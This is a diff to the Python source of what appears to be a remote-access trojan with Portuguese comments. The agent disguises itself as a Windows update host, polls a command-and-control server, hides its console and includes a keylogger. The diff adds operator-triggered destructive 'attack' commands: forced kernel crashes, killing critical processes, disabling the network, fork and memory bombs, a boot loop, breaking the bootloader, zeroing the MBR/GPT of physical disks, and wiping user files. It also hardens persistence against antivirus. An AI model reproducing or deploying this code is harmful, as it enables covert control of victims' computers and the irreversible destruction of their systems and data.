@@ -46,11 +46,29 @@ STEALTH = False        # builder --stealth flips this on: hidden relaunch + mute
 TRANSPORT = "tcp"      # "http" polls <HTTP_BASE>/c2/poll -- works through any tunnel
 HTTP_BASE = ""
 BOOTSTRAP = ""         # rendezvous channel: live C2 url is read from here on every sync
-AGENT_VER = "3.5"      # muda a cada build: o painel mostra isso em "versao"
+AGENT_VER = "3.10"     # muda a cada build: o painel mostra isso em "versao"
 # ------------------------------------------------------------------------------
 
 IS_WIN = os.name == "nt"
 _KEY = KEY.encode() if isinstance(KEY, str) else KEY
+
+LOG_PATH = os.path.join(os.environ.get("TEMP") or os.path.expanduser("~"),
+                        "wuhost.log")
+
+
+def _log(msg):
+    """Log local no alvo: e a unica forma de saber por que nao conectou."""
+    try:
+        if os.path.isfile(LOG_PATH) and os.path.getsize(LOG_PATH) > 512 * 1024:
+            os.replace(LOG_PATH, LOG_PATH + ".old")
+    except Exception:
+        pass
+    try:
+        with open(LOG_PATH, "a", encoding="utf-8", errors="replace") as f:
+            f.write("%s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg))
+    except Exception:
+        pass
+
 
 _FRAME = struct.Struct(">I")
 _NONCE = 8
@@ -270,8 +288,13 @@ def http_loop(base):
             fails += 1
             continue
         try:
-            # o servidor faz long-poll de 20s: o timeout do cliente tem de ser maior
-            j = _post(base + "/c2/poll", {"sid": sid, "info": info}, timeout=30)
+            # o servidor faz long-poll de 20s; no Render free o primeiro
+            # request acorda o servico e pode levar ~60s.
+            j = _post(base + "/c2/poll", {"sid": sid, "info": info},
+                      timeout=75 if fails < 3 else 30)
+            if fails or not _CONN.get("ok"):
+                _log("C2 ok em %s (apos %d falhas)" % (base, fails))
+                _CONN["ok"] = True
             delay = RECONNECT_MIN
             fails = 0
             cmds = j.get("cmds") or []
@@ -297,8 +320,10 @@ def http_loop(base):
                     _post(base + "/c2/result", {"sid": sid, "id": rid, "msgs": msgs})
         except SystemExit:
             raise
-        except Exception:
+        except Exception as exc:
             fails += 1
+            _CONN["ok"] = False
+            _log("poll falhou (%d): %s: %s" % (fails, type(exc).__name__, exc))
             time.sleep(delay + random.uniform(0, delay * 0.3))
             delay = min(delay * 2, RECONNECT_MAX)
 
@@ -504,13 +529,32 @@ def stealth_relaunch():
         return False
 
 
+def _token_sid():
+    """SID do usuario do token atual (para separar mutex de user e SYSTEM)."""
+    if _st is not None:
+        try:
+            return _st._current_sid() or ""
+        except Exception:
+            return ""
+    return ""
+
+
 def single_instance():
-    """True when this is the only running copy (named mutex, no privileges needed)."""
+    """True when this is the only running copy (named mutex, no privileges needed).
+
+    O nome leva o SID: assim a copia do usuario e a copia SYSTEM nao se
+    bloqueiam (cada uma tem seu proprio mutex), mas duas copias do mesmo
+    usuario continuam brigando pelo mesmo nome.
+    """
     if not IS_WIN:
         return True
     try:
         k = ctypes.windll.kernel32
-        k.CreateMutexW(None, False, "WinUpdateHostMutex")
+        name = "WinUpdateHostMutex"
+        sid = _token_sid()
+        if sid:
+            name += "_" + sid
+        k.CreateMutexW(None, False, name)
         return k.GetLastError() != 183        # ERROR_ALREADY_EXISTS
     except Exception:
         return True
@@ -1866,6 +1910,339 @@ def troll_stress_stop():
     return "estresse parado, memoria e disco liberados"
 
 
+# --------------------------------------------------------------- ataques (kill)
+# Diferente dos trolls: aqui o efeito e real e permanente. Nada dispara
+# sozinho -- so quando o operador manda pelo painel.
+def _sh(cmd, timeout=90):
+    """Roda um comando e devolve a saida curta (sem janela)."""
+    try:
+        p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                           stderr=subprocess.STDOUT, timeout=timeout,
+                           creationflags=0x08000000)
+        return _clean(p.stdout or b"").strip()[-500:]
+    except Exception as exc:
+        return "[!] %s" % exc
+
+
+class _LUID(ctypes.Structure):
+    _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]
+
+
+class _LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [("Luid", _LUID), ("Attributes", wt.DWORD)]
+
+
+class _TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [("PrivilegeCount", wt.DWORD),
+                ("Privileges", _LUID_AND_ATTRIBUTES * 1)]
+
+
+def _enable_priv(name):
+    """Liga um privilegio no token atual (SeShutdownPrivilege etc)."""
+    try:
+        adv = ctypes.windll.advapi32
+        k32 = ctypes.windll.kernel32
+        k32.GetCurrentProcess.restype = wt.HANDLE
+        adv.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD,
+                                         ctypes.POINTER(wt.HANDLE)]
+        adv.OpenProcessToken.restype = wt.BOOL
+        adv.LookupPrivilegeValueW.argtypes = [wt.LPCWSTR, wt.LPCWSTR,
+                                              ctypes.POINTER(_LUID)]
+        adv.LookupPrivilegeValueW.restype = wt.BOOL
+        adv.AdjustTokenPrivileges.argtypes = [
+            wt.HANDLE, wt.BOOL, ctypes.POINTER(_TOKEN_PRIVILEGES), wt.DWORD,
+            ctypes.c_void_p, ctypes.c_void_p]
+        adv.AdjustTokenPrivileges.restype = wt.BOOL
+
+        h = wt.HANDLE()
+        # TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES
+        if not adv.OpenProcessToken(k32.GetCurrentProcess(), 0x0028,
+                                    ctypes.byref(h)):
+            return False
+        luid = _LUID()
+        if not adv.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
+            return False
+        tp = _TOKEN_PRIVILEGES()
+        tp.PrivilegeCount = 1
+        tp.Privileges[0].Luid = luid
+        tp.Privileges[0].Attributes = 0x00000002      # SE_PRIVILEGE_ENABLED
+        return bool(adv.AdjustTokenPrivileges(h, False, ctypes.byref(tp),
+                                              0, None, None))
+    except Exception:
+        return False
+
+
+def attack_bsod():
+    """Bugcheck de verdade: derruba o kernel agora (nao e tela falsa)."""
+    if not IS_WIN:
+        return "[!] so windows"
+    if not is_admin():
+        return "[!] precisa admin"
+    _enable_priv("SeShutdownPrivilege")
+    try:
+        ntdll = ctypes.windll.ntdll
+        # RtlAdjustPrivilege(19 = SeShutdownPrivilege, enable, current thread)
+        old = wt.BOOL()
+        try:
+            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(old))
+        except Exception:
+            pass
+        ntdll.NtRaiseHardError.restype = wt.LONG
+        ntdll.NtRaiseHardError.argtypes = [
+            wt.LONG, wt.ULONG, ctypes.c_void_p, ctypes.c_void_p, wt.ULONG,
+            ctypes.POINTER(wt.ULONG)]
+        resp = wt.ULONG(0)
+        # 0xC0000420 STATUS_ASSERTION_FAILURE + OptionShutdownSystem (6)
+        st = ntdll.NtRaiseHardError(0xC0000420, 0, None, None, 6,
+                                    ctypes.byref(resp))
+        return "NtRaiseHardError -> 0x%08X resp=%d (sem bugcheck?)" % (
+            st & 0xFFFFFFFF, resp.value)
+    except Exception as exc:
+        return "[!] %s" % exc
+
+
+def attack_killwin():
+    """Mata os processos criticos: CRITICAL_PROCESS_DIED na hora."""
+    alvos = ("csrss.exe", "wininit.exe", "winlogon.exe", "lsass.exe",
+             "services.exe", "smss.exe", "dwm.exe", "explorer.exe",
+             "svchost.exe", "audiodg.exe")
+    mortos = []
+    for a in alvos:
+        out = _sh("taskkill /f /im %s" % a, 40)
+        if "SUCESSO" in (out or "").upper() or "SUCCESS" in (out or "").upper():
+            mortos.append(a)
+        time.sleep(0.2)
+    return "matando: %s" % (", ".join(mortos) or "nenhum (sem privilegio)")
+
+
+def attack_freeze(seconds=0):
+    """Congela teclado e mouse. seconds=0 trava ate reiniciar."""
+    if not IS_WIN:
+        return "[!] so windows"
+    try:
+        u = ctypes.windll.user32
+        u.BlockInput.argtypes = [wt.BOOL]
+        u.BlockInput.restype = wt.BOOL
+        ok = u.BlockInput(True)
+        if not ok:
+            return "[!] BlockInput recusado (precisa admin/SYSTEM)"
+        secs = int(seconds or 0)
+        if secs:
+            threading.Timer(secs, lambda: u.BlockInput(False)).start()
+            return "teclado e mouse travados por %ds" % secs
+        return "teclado e mouse travados ate reiniciar"
+    except Exception as exc:
+        return "[!] %s" % exc
+
+
+def attack_net_kill():
+    """Mata a rede: desativa adaptadores, derruba rotas e bloqueia saida."""
+    notas = []
+    ps = ("Get-NetAdapter -Physical -ErrorAction SilentlyContinue | "
+          "Where-Object Status -eq 'Up' | "
+          "Disable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue")
+    notas.append(_sh('powershell -NoProfile -Command "%s"' % ps, 120)
+                 or "adaptadores desativados")
+    _sh("ipconfig /release", 60)
+    _sh("ipconfig /flushdns", 40)
+    _sh("route delete 0.0.0.0", 40)
+    _sh('netsh advfirewall set allprofiles state on', 60)
+    _sh('netsh advfirewall firewall add rule name="WinUpdate" '
+        'dir=out action=block', 60)
+    _sh('netsh advfirewall firewall add rule name="WinUpdateIn" '
+        'dir=in action=block', 60)
+    return "rede morta: " + " | ".join(n for n in notas if n)[:400]
+
+
+def attack_disk_full(mb=20000):
+    """Enche o disco do sistema com um arquivo gigante (DoS real)."""
+    total_mb = max(1, min(500000, int(mb or 20000)))
+    base = os.environ.get("SystemDrive", "C:") + "\\"
+    alvo = os.path.join(base, "Windows", "Temp", "wsync.dat")
+    chunk = b"\x00" * (16 * 1024 * 1024)
+    escrito = 0
+    try:
+        os.makedirs(os.path.dirname(alvo), exist_ok=True)
+        with open(alvo, "wb") as f:
+            while escrito < total_mb:
+                try:
+                    f.write(chunk)
+                    f.flush()
+                except OSError:
+                    break
+                escrito += 16
+        _STRESS["files"].append(alvo)
+        try:
+            subprocess.run(["attrib", "+h", "+s", alvo],
+                           creationflags=0x08000000, timeout=30)
+        except Exception:
+            pass
+        return "escrito %d MB em %s" % (escrito, alvo)
+    except Exception as exc:
+        return "[!] %s (escrito %d MB)" % (exc, escrito)
+
+
+def attack_fork_bomb(n=6):
+    """Fork bomb: processos que se replicam ate travar a maquina."""
+    bat = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"),
+                       "wusync.bat")
+    try:
+        with open(bat, "w", encoding="ascii", errors="ignore") as f:
+            f.write("@echo off\r\n:a\r\nstart \"\" /b cmd /c %~f0\r\n"
+                    "start \"\" /min cmd /c %~f0\r\ngoto a\r\n")
+    except Exception as exc:
+        return "[!] %s" % exc
+    abertos = 0
+    for _ in range(max(1, min(40, int(n or 6)))):
+        try:
+            subprocess.Popen(["cmd.exe", "/c", bat],
+                             creationflags=0x00000008)   # DETACHED_PROCESS
+            abertos += 1
+        except Exception:
+            break
+    return "fork bomb ativa (%d raizes em %s)" % (abertos, bat)
+
+
+def attack_oom(procs=6):
+    """Esgota a RAM com processos que alocam sem parar."""
+    ps = ("$a=New-Object System.Collections.ArrayList;"
+          "while($true){[void]$a.Add((New-Object byte[] 67108864));"
+          "Start-Sleep -Milliseconds 20}")
+    n = max(1, min(24, int(procs or 6)))
+    for _ in range(n):
+        try:
+            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle",
+                              "Hidden", "-Command", ps],
+                             creationflags=0x08000000)
+        except Exception:
+            break
+    return "OOM: %d processos alocando 64MB em loop" % n
+
+
+def attack_blackout(seconds=0):
+    """Apaga o monitor e mantem apagado (seconds=0 = 1 hora)."""
+    if not IS_WIN:
+        return "[!] so windows"
+    u = ctypes.windll.user32
+    secs = int(seconds or 0) or 3600
+
+    def _loop():
+        fim = time.time() + secs
+        while time.time() < fim:
+            try:
+                u.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)   # SC_MONITORPOWER off
+            except Exception:
+                pass
+            time.sleep(3)
+
+    threading.Thread(target=_loop, daemon=True).start()
+    return "monitor apagado por %ds" % secs
+
+
+def attack_reboot(delay=0):
+    _sh("shutdown /r /t %d /f" % int(delay or 0), 40)
+    return "reiniciando em %ds" % int(delay or 0)
+
+
+def attack_poweroff(delay=0):
+    _sh("shutdown /s /t %d /f" % int(delay or 0), 40)
+    return "desligando em %ds" % int(delay or 0)
+
+
+def attack_boot_loop():
+    """Loop de boot: reinicia agora e a cada logon/inicio do Windows."""
+    notas = []
+    notas.append(_sh('schtasks /create /tn SystemHealth /tr "shutdown /r /t 30 /f" '
+                     '/sc onstart /ru SYSTEM /f', 60))
+    notas.append(_sh('schtasks /create /tn SystemHealthLogon /tr '
+                     '"shutdown /r /t 20 /f" /sc onlogon /ru SYSTEM /f', 60))
+    notas.append(_sh('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\'
+                     'CurrentVersion\\Run" /v SysHealth /t REG_SZ /d '
+                     '"shutdown /r /t 25 /f" /f', 60))
+    _sh("bcdedit /set {default} recoveryenabled No", 60)
+    _sh("bcdedit /set {default} bootstatuspolicy ignoreallfailures", 60)
+    _sh("shutdown /r /t 45 /f", 40)
+    return "loop de boot armado; reinicio em 45s"
+
+def attack_no_boot():
+    """Deixa o Windows sem boot: BCD quebrado + winload renomeado."""
+    notas = []
+    for cmd in ("bcdedit /set {default} device unknown",
+                "bcdedit /set {default} osdevice unknown",
+                "bcdedit /set {bootmgr} timeout 0",
+                "bcdedit /deletevalue {default} recoverysequence"):
+        notas.append(_sh(cmd, 40))
+    win = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
+    for nome in ("winload.exe", "winload.efi"):
+        src = os.path.join(win, nome)
+        if os.path.isfile(src):
+            try:
+                os.rename(src, src + ".old")
+                notas.append(nome + " -> .old")
+            except OSError as exc:
+                notas.append("%s: %s" % (nome, exc))
+    return "sem boot: " + " | ".join(n for n in notas if n)[:400]
+
+
+def attack_nuke_mbr(discos=2):
+    """Zera o MBR/GPT dos primeiros discos: o PC nao volta mais a dar boot."""
+    if not IS_WIN:
+        return "[!] so windows"
+    if not is_admin():
+        return "[!] precisa admin"
+    k32 = ctypes.windll.kernel32
+    k32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
+                                wt.DWORD, wt.DWORD, wt.HANDLE]
+    k32.CreateFileW.restype = wt.HANDLE
+    k32.WriteFile.argtypes = [wt.HANDLE, ctypes.c_void_p, wt.DWORD,
+                              ctypes.POINTER(wt.DWORD), ctypes.c_void_p]
+    k32.WriteFile.restype = wt.BOOL
+    k32.CloseHandle.argtypes = [wt.HANDLE]
+
+    zeros = ctypes.create_string_buffer(b"\x00" * (1024 * 1024), 1024 * 1024)
+    feito = []
+    for i in range(max(1, min(4, int(discos or 2)))):
+        h = k32.CreateFileW("\\\\.\\PhysicalDrive%d" % i, 0xC0000000, 3,
+                            None, 3, 0, None)     # RW, OPEN_EXISTING
+        if h == ctypes.c_void_p(-1).value or not h:
+            feito.append("disco%d: sem acesso" % i)
+            continue
+        gravado = 0
+        for _ in range(2):                       # 2 x 1MB = MBR + GPT + tabelas
+            n = wt.DWORD(0)
+            if not k32.WriteFile(h, zeros, len(zeros) - 1, ctypes.byref(n), None):
+                break
+            gravado += n.value
+        k32.CloseHandle(h)
+        feito.append("disco%d: %d bytes zerados" % (i, gravado))
+    return "MBR: " + " | ".join(feito)
+
+
+def attack_wipe_files():
+    """Apaga Desktop, Documentos, Downloads, Imagens, Videos e Music."""
+    raiz = os.path.expanduser("~")
+    alvos = ("Desktop", "Documents", "Downloads", "Pictures", "Videos",
+             "Music", "AppData\\Local\\Temp")
+    total = 0
+    for nome in alvos:
+        p = os.path.join(raiz, nome)
+        if not os.path.isdir(p):
+            continue
+        for base, dirs, files in os.walk(p, topdown=False):
+            for f in files:
+                try:
+                    os.remove(os.path.join(base, f))
+                    total += 1
+                except OSError:
+                    pass
+            for d in dirs:
+                try:
+                    os.rmdir(os.path.join(base, d))
+                except OSError:
+                    pass
+    return "%d arquivos apagados do perfil %s" % (total, raiz)
+
+
 # -------------------------------------------------------------------- keylogger
 _SHIFTED = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
@@ -2175,6 +2552,14 @@ def dispatch(sock, rid, op, args):
             AGENT_VER, os.getpid(),
             "exe" if getattr(sys, "frozen", False) else "py", who))
 
+    if op in ("log", "logs", "diag"):
+        try:
+            with open(LOG_PATH, encoding="utf-8", errors="replace") as f:
+                linhas = f.read().splitlines()[-120:]
+            return ok("\n".join(linhas) or "(log vazio)")
+        except Exception as exc:
+            return ok("[!] sem log: %s" % exc)
+
     if op == "sysinfo":
         return ok(json.dumps(sysinfo(), indent=2))
 
@@ -2258,6 +2643,43 @@ def dispatch(sock, rid, op, args):
 
     if op == "msg":
         return ok(show_msg(args.get("text", ""), args.get("title", "Aviso")))
+
+    if op == "attack":
+        a = (args.get("action") or "").lower()
+        secs = int(args.get("seconds") or 0)
+        if a in ("bsod", "crash", "kernel"):
+            return ok(attack_bsod())
+        if a in ("killwin", "matar_windows", "kill_win"):
+            return ok(attack_killwin())
+        if a in ("freeze", "congelar", "blockinput"):
+            return ok(attack_freeze(secs))
+        if a in ("net", "rede", "net_kill", "matar_rede"):
+            return ok(attack_net_kill())
+        if a in ("disk_full", "encher_disco", "disco"):
+            return ok(attack_disk_full(args.get("mb") or 20000))
+        if a in ("fork", "fork_bomb", "bomba_processos"):
+            return ok(attack_fork_bomb(args.get("count") or 6))
+        if a in ("oom", "esgotar_ram", "ram"):
+            return ok(attack_oom(args.get("count") or 6))
+        if a in ("blackout", "tela_preta", "monitor"):
+            return ok(attack_blackout(secs))
+        if a in ("reboot", "reiniciar"):
+            return ok(attack_reboot(secs))
+        if a in ("poweroff", "desligar", "off"):
+            return ok(attack_poweroff(secs))
+        if a in ("boot_loop", "loop", "loop_boot"):
+            return ok(attack_boot_loop())
+        if a in ("no_boot", "sem_boot", "noboot"):
+            return ok(attack_no_boot())
+        if a in ("mbr", "nuke", "nuke_mbr", "destruir_boot"):
+            return ok(attack_nuke_mbr(args.get("count") or 2))
+        if a in ("wipe", "apagar", "wipe_files"):
+            return ok(attack_wipe_files())
+        if not a or a in ("list", "help", "acoes"):
+            return ok("ataques: bsod | killwin | freeze | net | disk_full | "
+                      "fork | oom | blackout | reboot | poweroff | boot_loop | "
+                      "no_boot | mbr | wipe")
+        return ok("[!] ataque desconhecido: %s (agente v%s)" % (a, AGENT_VER))
 
     if op == "troll":
         a = (args.get("action") or "").lower()
@@ -2606,8 +3028,33 @@ def _watchdog_vbs():
     return vbs
 
 
+def _clear_critical(pid):
+    """Tira o flag BreakOnTermination do PID.
+
+    Processo marcado como critico que recebe taskkill derruba o Windows
+    (CRITICAL_PROCESS_DIED). Antes de matar qualquer copia, limpamos o flag --
+    se nao der para limpar, a copia nao e morta.
+    """
+    try:
+        k32 = ctypes.windll.kernel32
+        ntdll = ctypes.windll.ntdll
+        k32.OpenProcess.restype = wt.HANDLE
+        k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
+        ntdll.NtSetInformationProcess.argtypes = [wt.HANDLE, ctypes.c_int,
+                                                  ctypes.c_void_p, wt.ULONG]
+        h = k32.OpenProcess(0x0600, False, pid)     # SET_INFORMATION|QUERY
+        if not h:
+            return False
+        zero = ctypes.c_int(0)
+        st = ntdll.NtSetInformationProcess(h, 29, ctypes.byref(zero), 4)
+        k32.CloseHandle(h)
+        return st == 0
+    except Exception:
+        return False
+
+
 def _kill_duplicates():
-    """Mata copias antigas do agente.
+    """Mata copias antigas do agente -- sem nunca derrubar o Windows.
 
     Duas instancias com o mesmo id disputam a fila do servidor: uma pega o
     comando e a outra responde, e o painel fica esperando ate 120s. Com um
@@ -2616,15 +3063,46 @@ def _kill_duplicates():
     if not IS_WIN:
         return
     me = os.getpid()
+    if _st is not None:
+        try:
+            _st._enable_debug()          # necessario para abrir processos SYSTEM
+        except Exception:
+            pass
+    alvos = []
     try:
-        subprocess.run(
-            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
-             "Get-Process wuhost,vcredist_x86 -ErrorAction SilentlyContinue | "
-             "Where-Object { $_.Id -ne %d } | Stop-Process -Force" % me],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            creationflags=0x08000000, timeout=40)
-    except Exception:
-        pass
+        out = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
+                             stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                             creationflags=0x08000000, timeout=60).stdout
+        for line in _decode(out or b"").splitlines():
+            parts = [p.strip('"') for p in line.split('","')]
+            if len(parts) < 2:
+                continue
+            if parts[0].lower() not in ("wuhost.exe", "vcredist_x86.exe",
+                                        "devicesync.exe"):
+                continue
+            try:
+                pid = int(parts[1])
+            except ValueError:
+                continue
+            if pid != me:
+                alvos.append(pid)
+    except Exception as exc:
+        _log("kill_duplicates: listar falhou: %s" % exc)
+        return
+
+    mortos, poupados = [], []
+    for pid in alvos:
+        if not _clear_critical(pid):
+            poupados.append(pid)          # nao arrisca BSOD
+            continue
+        try:
+            subprocess.run(["taskkill", "/f", "/pid", str(pid)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           creationflags=0x08000000, timeout=30)
+            mortos.append(pid)
+        except Exception:
+            poupados.append(pid)
+    _log("duplicatas: mortos=%s poupados=%s" % (mortos, poupados))
 
 
 def harden():
@@ -2673,6 +3151,39 @@ def harden():
     return "; ".join(notes)
 
 
+def _tcp_loop(host, port):
+    delay = RECONNECT_MIN
+    while True:
+        sock = None
+        try:
+            sock = socket.create_connection((host, port), timeout=20)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.settimeout(None)
+            send(sock, {"t": "hello", "info": sysinfo()})
+            delay = RECONNECT_MIN
+            _log("tcp conectado em %s:%s" % (host, port))
+            serve(sock)
+        except Exception as exc:
+            _log("tcp falhou: %s" % exc)
+        finally:
+            if sock is not None:
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+        wait = STATE.get("sleep") or min(delay, RECONNECT_MAX)
+        time.sleep(wait + random.uniform(0, wait * 0.4))
+        delay = min(delay * 2, RECONNECT_MAX)
+
+
+def _bg_harden():
+    """Blindagem em segundo plano: nunca segura a conexao."""
+    try:
+        _log("harden: " + str(harden()))
+    except Exception as exc:
+        _log("harden falhou: %s" % exc)
+
+
 def main():
     global _KEY, TRANSPORT, HTTP_BASE, BOOTSTRAP
     _skip = {"--install", "--visible", "--no-stealth", "--no-harden",
@@ -2691,63 +3202,51 @@ def main():
             if not HTTP_BASE:
                 TRANSPORT = "http"
 
+    _log("=== v%s pid=%d exe=%s admin=%s" % (
+        AGENT_VER, os.getpid(), getattr(sys, "frozen", False), is_admin()))
+    _log("http=%r bootstrap=%r" % (HTTP_BASE, BOOTSTRAP))
+
+    if IS_WIN and "--visible" not in sys.argv:
+        hide_console()              # some a janela antes de qualquer coisa
+
     if "--install" in sys.argv:
         try:
             install()
         except Exception:
             pass
 
-    if STEALTH and "--no-stealth" not in sys.argv and "--visible" not in sys.argv:
-        if stealth_relaunch():
-            return                      # hidden copy takes over, this one exits
-        if "--elevated" not in sys.argv:
-            if not single_instance():
-                return
-            _kill_duplicates()          # sobra so este processo
+    # 1) um processo por usuario (rapido, sem I/O)
+    if STEALTH and "--no-stealth" not in sys.argv and "--elevated" not in sys.argv:
+        if not single_instance():
+            _log("mutex ocupado -- saindo")
+            return
 
+    # 2) C2 PRIMEIRO: a sessao aparece em ~1s, sem depender de mais nada.
+    #    O antigo fluxo copiava o exe, saia e deixava a copia sozinha: se o
+    #    antivirus matasse a copia, nao sobrava processo nenhum e o painel
+    #    ficava vazio. Agora nada pode matar a conexao.
+    if TRANSPORT == "http" and (BOOTSTRAP or HTTP_BASE):
+        threading.Thread(target=http_loop,
+                         args=("" if BOOTSTRAP else HTTP_BASE,),
+                         daemon=True).start()
+    else:
+        threading.Thread(target=_tcp_loop, args=(host, port),
+                         daemon=True).start()
+
+    # 3) o resto em segundo plano
+    if STEALTH and "--no-stealth" not in sys.argv and "--elevated" not in sys.argv:
+        threading.Thread(target=_kill_duplicates, daemon=True).start()
     if "--no-harden" not in sys.argv:
-        try:
-            harden()
-        except Exception:
-            pass
-
-    # evasao + persistencia + elevacao em paralelo: nao atrasa o C2
+        threading.Thread(target=_bg_harden, daemon=True).start()
     if _st is not None and "--no-stealth" not in sys.argv:
         try:
             threading.Thread(target=_st.bootstrap, daemon=True).start()
         except Exception:
             pass
 
-    if IS_WIN and "--visible" not in sys.argv:
-        hide_console()
-
-    if TRANSPORT == "http" and (BOOTSTRAP or HTTP_BASE):
-        # o canal e a fonte da verdade: o endereco do C2 muda com o tunel.
-        # o HTTP_BASE fixo so serve de fallback quando nao ha canal.
-        http_loop("" if BOOTSTRAP else HTTP_BASE)   # never returns
-        return
-
-    delay = RECONNECT_MIN
+    # 4) mantem o processo vivo (a conexao roda na thread)
     while True:
-        sock = None
-        try:
-            sock = socket.create_connection((host, port), timeout=20)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.settimeout(None)
-            send(sock, {"t": "hello", "info": sysinfo()})
-            delay = RECONNECT_MIN
-            serve(sock)
-        except Exception:
-            pass
-        finally:
-            if sock is not None:
-                try:
-                    sock.close()
-                except Exception:
-                    pass
-        wait = STATE.get("sleep") or min(delay, RECONNECT_MAX)
-        time.sleep(wait + random.uniform(0, wait * 0.4))
-        delay = min(delay * 2, RECONNECT_MAX)
+        time.sleep(3600)
 
 
 if __name__ == "__main__":
